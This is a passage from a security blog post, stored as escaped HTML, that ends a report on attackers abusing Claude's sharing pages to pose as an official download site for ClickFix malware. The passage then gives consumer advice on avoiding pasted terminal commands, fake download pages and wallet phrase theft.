they did not write.\u003c/p\u003e\u003ch2\u003eWhy this goes beyond Claude\u003c/h2\u003e\u003cp\u003eAttackers have been abusing legitimate websites to distribute malware for years. What makes this case interesting is how easily Claude's sharing features could be used to create something that looked like an official software download page, without compromising Anthropic's infrastructure.\u003c/p\u003e\u003cp\u003eClaude is unlikely to be the last AI service targeted this way. As more platforms allow users to publish and share content, attackers have more opportunities to exploit the reputation of those services. The challenge for platform operators is finding ways to prevent that abuse without making legitimate sharing unnecessarily difficult.\u003c/p\u003e\u003cp\u003eFor users, the distinction is worth remembering. A genuine website address tells you where content is hosted, but it doesn't necessarily tell you who created it or whether you should trust it.\u003c/p\u003e\u003ch2\u003eHow to protect yourself\u003c/h2\u003e\u003cul type=\"disc\"\u003e\u003cli data-list-item-id=\"edfc88eb7579f843c82adc66243e061d1\"\u003eNever paste into Terminal (or PowerShell) a command that you did not write yourself. This one habit defeats the whole ClickFix family.\u0026nbsp;\u003c/li\u003e\u003cli data-list-item-id=\"ec967e55d9b60bb6691b024d2a95e2d15\"\u003eDownload software from the main site of the vendor — and type the address yourself or use a bookmark. The real download page of Claude is claude.com/download. Do not trust the search results, and be extra careful with sponsored ads.\u003c/li\u003e\u003cli data-list-item-id=\"e55f655cf2bb6e06bc90158a0d59c4af7\"\u003eTreat the “user-generated / unverified” labels as a stop sign. If a “download” or “install” page lives on a sharing or artifact URL and not on the own product site of the company, leave it.\u003c/li\u003e\u003cli data-list-item-id=\"e6e92b09b36cd54ff7d342e668284ddba\"\u003eNever type your wallet recovery phrase into software that asks for it unexpectedly. The seed entry happens on the hardware device. A “restore/validate your phrase” prompt inside the app is theft.\u003c/li\u003e\u003cli data-list-item-id=\"edccf837b687961a074f5261a4b687f87\"\u003eKeep a reputable security software turned on. It blocks the known command-and-control servers and detects this behaviour.\u003c/li\u003e\u003cli data-list-item-id=\"e4e8607ff0369cb902840b9d76a86cd36\"\u003eIf you think that you already ran something like this, expect a full compromise. From a different, clean device, change every important password (email, banking and crypto exchanges first), log out from all sessions, and turn on multi-factor authentication. For crypto, move the funds to a wallet that is created from a completely new recovery phrase, and reinstall the wallet applications only from the official vendor.\u003c/li\u003e\u003c/ul\u003e"}],"itemState":"published","timeToRead":"14","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/blog/sites/default/files/styles/social_media_meta/public/2026-10/claude_hero.jpg?h=10cbc464\u0026itok=fobM0kkk","relatedPosts":[{"urlAlias":"/blog-post/checkoutswitch-scam","title":"CheckoutSwitch:
